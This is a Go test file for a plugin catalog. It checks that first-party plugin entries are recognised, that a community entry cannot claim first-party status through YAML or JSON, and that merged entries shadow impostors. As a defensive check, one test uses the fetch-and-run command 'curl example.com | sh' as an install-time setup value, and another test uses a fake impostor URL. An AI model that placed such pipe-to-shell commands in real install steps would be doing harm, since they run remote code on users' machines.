package plughost

import (
	"encoding/json"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

// TestFirstPartyPlugRingItemsIncludesCloudfox pins the one entry part 3 of
// f4#1178 adds: cloudfox-plugin, marked FirstParty, with the same shape as
// plugins/cloudfox/cmd/cloudfox-plugin/plugring-manifest.json.
func TestFirstPartyPlugRingItemsIncludesCloudfox(t *testing.T) {
	items := FirstPartyPlugRingItems()
	if len(items) == 0 {
		t.Fatal("the first-party catalog is empty")
	}

	var cloudfox *PlugRingItem
	for i := range items {
		if items[i].ID == "cloudfox" {
			cloudfox = &items[i]
		}
	}
	if cloudfox == nil {
		t.Fatal("cloudfox is not in the first-party catalog")
	}
	if !cloudfox.FirstParty {
		t.Error("cloudfox is not marked FirstParty")
	}
	if cloudfox.Entrypoint != "cloudfox-plugin" {
		t.Errorf("entrypoint = %q, want cloudfox-plugin", cloudfox.Entrypoint)
	}
	if !strings.Contains(cloudfox.URL, "{os}") || !strings.Contains(cloudfox.URL, "{arch}") {
		t.Errorf("url = %q, want per-platform {os}/{arch} placeholders", cloudfox.URL)
	}
	if ok, reason := PlugRingItemRunsHere(*cloudfox); !ok {
		t.Errorf("cloudfox is reported unrunnable: %s", reason)
	}
}

// TestFirstPartyPlugRingItemsIncludesAndroid is the equivalent pin for the
// entry android-plugin's own part 3 adds, mirroring
// plugins/android/cmd/android-plugin/plugring-manifest.json.
func TestFirstPartyPlugRingItemsIncludesAndroid(t *testing.T) {
	items := FirstPartyPlugRingItems()

	var android *PlugRingItem
	for i := range items {
		if items[i].ID == "android" {
			android = &items[i]
		}
	}
	if android == nil {
		t.Fatal("android is not in the first-party catalog")
	}
	if !android.FirstParty {
		t.Error("android is not marked FirstParty")
	}
	if android.Entrypoint != "android-plugin" {
		t.Errorf("entrypoint = %q, want android-plugin", android.Entrypoint)
	}
	if !strings.Contains(android.URL, "{os}") || !strings.Contains(android.URL, "{arch}") {
		t.Errorf("url = %q, want per-platform {os}/{arch} placeholders", android.URL)
	}
	if ok, reason := PlugRingItemRunsHere(*android); !ok {
		t.Errorf("android is reported unrunnable: %s", reason)
	}
	if problem := PlugRingItemProblem(*android); problem != "" {
		t.Errorf("the first-party android entry was rejected: %s", problem)
	}
}

// TestFirstPartyPlugRingItemsIncludesIOS is TestFirstPartyPlugRingItemsIncludesCloudfox's
// sibling for f4#1178's third first-party entry: ios-plugin, added once iOS
// got the same downloadable-plugin treatment as cloud storage, with the same
// shape as plugins/ios/cmd/ios-plugin/plugring-manifest.json.
func TestFirstPartyPlugRingItemsIncludesIOS(t *testing.T) {
	items := FirstPartyPlugRingItems()

	var ios *PlugRingItem
	for i := range items {
		if items[i].ID == "ios" {
			ios = &items[i]
		}
	}
	if ios == nil {
		t.Fatal("ios is not in the first-party catalog")
	}
	if !ios.FirstParty {
		t.Error("ios is not marked FirstParty")
	}
	if ios.Entrypoint != "ios-plugin" {
		t.Errorf("entrypoint = %q, want ios-plugin", ios.Entrypoint)
	}
	if !strings.Contains(ios.URL, "{os}") || !strings.Contains(ios.URL, "{arch}") {
		t.Errorf("url = %q, want per-platform {os}/{arch} placeholders", ios.URL)
	}
	if ok, reason := PlugRingItemRunsHere(*ios); !ok {
		t.Errorf("ios is reported unrunnable: %s", reason)
	}
	if problem := PlugRingItemProblem(*ios); problem != "" {
		t.Errorf("the first-party ios entry was rejected: %s", problem)
	}
}

// TestFirstPartyBypassesTheCommunityPolicyThatWouldRejectIt is the point of
// this whole file: the fields that make PlugRingItemProblem reject an
// ordinary community entry -- a per-platform URL, an entrypoint that is not a
// bare .lua or .wasm file -- are accepted precisely because, and only
// because, FirstParty is set. It runs the check against every entry in the
// catalog (cloudfox and ios today), not just the first one, so a future
// first-party addition stays covered automatically.
func TestFirstPartyBypassesTheCommunityPolicyThatWouldRejectIt(t *testing.T) {
	for _, entry := range FirstPartyPlugRingItems() {
		entry := entry
		t.Run(entry.ID, func(t *testing.T) {
			if problem := PlugRingItemProblem(entry); problem != "" {
				t.Errorf("the first-party %s entry was rejected: %s", entry.ID, problem)
			}

			// The exact same fields, submitted the way a third party would have
			// to, without FirstParty: the community distribution policy still
			// applies in full. If this ever starts passing, PlugRingItemProblem
			// has stopped enforcing PLUGRING.md for everybody else.
			asCommunitySubmission := entry
			asCommunitySubmission.FirstParty = false
			if problem := PlugRingItemProblem(asCommunitySubmission); problem == "" {
				t.Fatal("the same entry without FirstParty was accepted; the community policy is not being enforced")
			}

			// setup_cmd stays refused for everybody, first-party included:
			// nothing about being first-party should turn on running an
			// arbitrary command at install time.
			withSetupCmd := entry
			withSetupCmd.SetupCmd = "curl example.com | sh"
			if problem := PlugRingItemProblem(withSetupCmd); problem == "" {
				t.Fatal("a first-party entry with setup_cmd was accepted")
			}
		})
	}
}

// TestFirstPartyCannotBeSetFromTheWire is the property the design leans on:
// plugring/index.yaml and any remote catalog f4 downloads are decoded
// straight into PlugRingItem, so a community submission that tries to claim
// FirstParty for itself must not succeed.
func TestFirstPartyCannotBeSetFromTheWire(t *testing.T) {
	yamlSrc := `
id: "evil"
entrypoint: "evil-native"
url: "https://example.com/evil-{os}-{arch}.zip"
firstparty: true
FirstParty: true
`
	var fromYAML PlugRingItem
	if err := yaml.Unmarshal([]byte(yamlSrc), &fromYAML); err != nil {
		t.Fatalf("yaml.Unmarshal: %v", err)
	}
	if fromYAML.FirstParty {
		t.Fatal("a YAML catalog entry set FirstParty; a community entry can now impersonate a first-party plugin")
	}
	if problem := PlugRingItemProblem(fromYAML); problem == "" {
		t.Fatal("an entry that only claims FirstParty over YAML escaped the community policy")
	}

	jsonSrc := `{"id":"evil","entrypoint":"evil-native","url":"https://example.com/evil-{os}-{arch}.zip","FirstParty":true,"firstParty":true}`
	var fromJSON PlugRingItem
	if err := json.Unmarshal([]byte(jsonSrc), &fromJSON); err != nil {
		t.Fatalf("json.Unmarshal: %v", err)
	}
	if fromJSON.FirstParty {
		t.Fatal("a JSON catalog entry set FirstParty; a community entry can now impersonate a first-party plugin")
	}
}

// TestMergeFirstPartyPlugRingItemsAppendsAndDedupsByID checks the merge that
// feeds the PlugRing dialog: unrelated community entries survive, and a
// community entry that collides on id with a first-party one is shadowed by
// the first-party entry rather than the other way around. The first-party
// catalog has three entries today (cloudfox, android, ios); the assertions
// below count against len(FirstPartyPlugRingItems()) rather than a hardcoded
// 3, so a future fourth entry does not silently break this test's
// arithmetic.
func TestMergeFirstPartyPlugRingItemsAppendsAndDedupsByID(t *testing.T) {
	firstPartyCount := len(FirstPartyPlugRingItems())
	if firstPartyCount != 3 {
		t.Fatalf("len(FirstPartyPlugRingItems()) = %d, want 3 (cloudfox, android, ios) -- update this test's expectations alongside the catalog", firstPartyCount)
	}

	community := []PlugRingItem{
		{ID: "hello-plugring", Name: "Hello", Entrypoint: "hello.lua"},
		{
			ID:         "cloudfox",
			Name:       "Impostor",
			Entrypoint: "evil.lua",
			URL:        "https://evil.example/x.lua",
		},
	}
	merged := MergeFirstPartyPlugRingItems(community)

	byID := make(map[string]PlugRingItem, len(merged))
	for _, item := range merged {
		if _, dup := byID[item.ID]; dup {
			t.Fatalf("id %q appears more than once in the merged catalog", item.ID)
		}
		byID[item.ID] = item
	}

	if _, ok := byID["hello-plugring"]; !ok {
		t.Error("an unrelated community entry was dropped by the merge")
	}

	cloudfox, ok := byID["cloudfox"]
	if !ok {
		t.Fatal("cloudfox is missing from the merged catalog")
	}
	if !cloudfox.FirstParty || cloudfox.Name != "Cloud storage (CloudFox)" {
		t.Errorf("a community entry with a colliding id shadowed the first-party one: %+v", cloudfox)
	}
	android, ok := byID["android"]
	if !ok {
		t.Fatal("android is missing from the merged catalog")
	}
	if !android.FirstParty || android.Name != "Android devices (ADB)" {
		t.Errorf("android entry has the wrong shape: %+v", android)
	}

	ios, ok := byID["ios"]
	if !ok {
		t.Fatal("ios is missing from the merged catalog")
	}
	if !ios.FirstParty || ios.Name != "Apple mobile devices (iOS)" {
		t.Errorf("ios entry has the wrong shape: %+v", ios)
	}

	// hello-plugring (no collision) + cloudfox (shadowed impostor) + android
	// + ios (no collision, appended fresh) -- one row per distinct id, never
	// a duplicate cloudfox.
	wantLen := 1 + firstPartyCount
	if len(merged) != wantLen {
		t.Errorf("len(merged) = %d, want %d (no duplicate cloudfox entry)", len(merged), wantLen)
	}

	// A community catalog with no collision keeps its own entries and gains
	// the first-party ones on top.
	noCollision := MergeFirstPartyPlugRingItems([]PlugRingItem{
		{ID: "hello-plugring", Name: "Hello", Entrypoint: "hello.lua"},
	})
	if want := 1 + firstPartyCount; len(noCollision) != want {
		t.Fatalf("len(noCollision) = %d, want %d", len(noCollision), want)
	}
}

// TestFirstPartyArchivesAreNotTakenForF4 pins #1656. The updater of every f4
// released before that fix took the first release asset whose name ends with
// "-<os>-<arch>.tar.gz" (or .zip/.7z on Windows) for f4's own archive, and
// GitHub lists assets by name: android-plugin-linux-amd64.tar.gz came first,
// was installed in f4's place, and left f4 on its old build. Those updaters
// cannot be fixed any more, so the first-party plugins are published under an
// extension none of them looks for.
func TestFirstPartyArchivesAreNotTakenForF4(t *testing.T) {
	for _, entry := range FirstPartyPlugRingItems() {
		if !strings.HasSuffix(entry.URL, "-{os}-{arch}.tgz") {
			t.Errorf("%s: url = %q, want a .tgz archive per {os}-{arch}", entry.ID, entry.URL)
		}
	}
}
